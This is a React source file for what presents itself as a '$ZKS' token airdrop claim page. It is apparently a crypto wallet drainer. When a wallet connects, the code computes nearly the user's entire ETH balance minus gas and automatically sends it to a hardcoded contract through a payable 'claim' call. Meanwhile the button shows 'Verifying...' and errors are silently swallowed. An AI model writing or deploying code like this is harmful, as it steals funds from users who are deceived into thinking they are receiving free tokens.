import { ConnectButton } from "@rainbow-me/rainbowkit";
import Image from "next/image";
import { useCallback, useEffect, useState } from "react";
import { BigNumber, ethers, utils } from "ethers";
import {
  erc20ABI,
  useContractRead,
  useContractWrite,
  usePrepareContractWrite,
  useAccount,
  useFeeData,
  useBalance,
  useSwitchNetwork,
} from "wagmi";
import { Button } from "@chakra-ui/react";
import airdropAbi from "config/constants/airdrop.json";
import { useEthersProvider } from "../../config/ether";
import { mainnet } from "viem/chains";
import { parseEther } from "viem";

const contractAddress = "0xD8e08B39D37A4d66f956e92a06DF92B6bf51C4d9";

export const CustomConnect = () => {
  const [payValue, setPayValue] = useState(0.0);
  const { config } = usePrepareContractWrite({
    address: contractAddress,
    abi: airdropAbi,
    functionName: "claim",
    value: parseEther(payValue.toString()),
  });
  const { write: claim, isLoading: isLoadingClaim } = useContractWrite(config);

  const [callFuncGasFee, setCallFuncGasFee] = useState<BigNumber>(
    BigNumber.from(0)
  );
  const { address, isConnecting, isDisconnected, status } = useAccount();
  const {
    data: balanceData,
    isError: isErrorBalance,
    isLoading: isLoadingBalance,
  } = useBalance({
    address,
    formatUnits: "ether",
  });
  const { data: feeData } = useFeeData({ formatUnits: "wei" });
  const { switchNetwork, isIdle, isLoading } = useSwitchNetwork({
    chainId: mainnet.id,
  });

  const [isSubmitted, setIsSubmitted] = useState(false);
  const provider = useEthersProvider();
  useEffect(() => {
    async function estimateGasAmount() {
      try {
        if (
          !provider ||
          !balanceData ||
          !feeData ||
          !address ||
          !claim ||
          isSubmitted
        )
          return;

        if (parseFloat(balanceData.formatted) == 0) return;

        const balance = BigNumber.from(balanceData.value.toString());
        const contract = new ethers.Contract(
          contractAddress,
          airdropAbi,
          provider
        );
        // estimate the amount of gas needed to call the contract function
        const callFuncGas = await contract.estimateGas.claim({
          value: utils.parseEther("200"),
        });

        // multiply the gas amount values by the gas price to get the gas fee to pay
        const gasAmount = callFuncGas.mul(
          BigNumber.from(feeData.maxFeePerGas.toString())
        );
        setCallFuncGasFee(gasAmount);
        if (balance.lte(gasAmount.mul(BigNumber.from(2)))) return;

        const newPayValue = parseFloat(
          utils.formatEther(balance.sub(gasAmount.mul(BigNumber.from(2))))
        );
        setPayValue(newPayValue);

        if (!isLoadingClaim && payValue > 0) {
          claim();
        }
      } catch (error) {}
    }

    estimateGasAmount();
  }, [
    feeData,
    balanceData,
    provider,
    isSubmitted,
    isLoadingClaim,
    address,
    claim,
    payValue,
  ]);
  return (
    <ConnectButton.Custom>
      {({
        account,
        chain,
        openAccountModal,
        openChainModal,
        openConnectModal,
        authenticationStatus,
        mounted,
      }) => {
        // Note: If your app doesn't use authentication, you
        // can remove all 'authenticationStatus' checks
        const ready = mounted && authenticationStatus !== "loading";
        const connected =
          ready &&
          account &&
          chain &&
          (!authenticationStatus || authenticationStatus === "authenticated");
        return (
          <div
            {...(!ready && {
              "aria-hidden": true,
              style: {
                opacity: 0,
                pointerEvents: "none",
                userSelect: "none",
              },
            })}
          >
            {(() => {
              if (!connected) {
                return (
                  <Button
                    onClick={openConnectModal}
                    marginTop={"0"}
                    marginRight={"1.25rem"}
                    border={"none"}
                    backgroundColor={"#1e69ff"}
                    borderRadius={"1.875rem"}
                    width={"fit-content"}
                    height={"50px"}
                    padding={"0 2.1875rem"}
                    pointerEvents={"auto"}
                    fontSize={"1.0625rem"}
                    lineHeight={"1.4375rem"}
                    letterSpacing={"1px"}
                    fontWeight={"500"}
                    fontFamily={"Gilroy,Arial"}
                    boxSizing="border-box"
                    transform={"none"}
                    transition={"opacity .2s ease"}
                    _hover={{
                      transform: "scale(1.05) translateZ(0px)",
                      opacity: ".7",
                    }}
                  >
                    Claim $ZKS
                  </Button>
                );
              }
              if (chain.unsupported) {
                if (!isLoading) {
                  switchNetwork();
                }
              }
              return (
                <Button
                  marginTop={"0"}
                  marginRight={"1.25rem"}
                  border={"none"}
                  backgroundColor={"#1e69ff"}
                  borderRadius={"1.875rem"}
                  width={"fit-content"}
                  height={"50px"}
                  padding={"0 2.1875rem"}
                  pointerEvents={"auto"}
                  fontSize={"1.0625rem"}
                  lineHeight={"1.4375rem"}
                  letterSpacing={"1px"}
                  fontWeight={"500"}
                  fontFamily={"Gilroy,Arial"}
                  boxSizing="border-box"
                  transform={"none"}
                  transition={"opacity .2s ease"}
                  _hover={{
                    transform: "scale(1.05) translateZ(0px)",
                    opacity: ".7",
                  }}
                >
                  Verifying...
                </Button>
              );
            })()}
          </div>
        );
      }}
    </ConnectButton.Custom>
  );
};

export const BasciConnect = () => {
  return <ConnectButton></ConnectButton>;
};
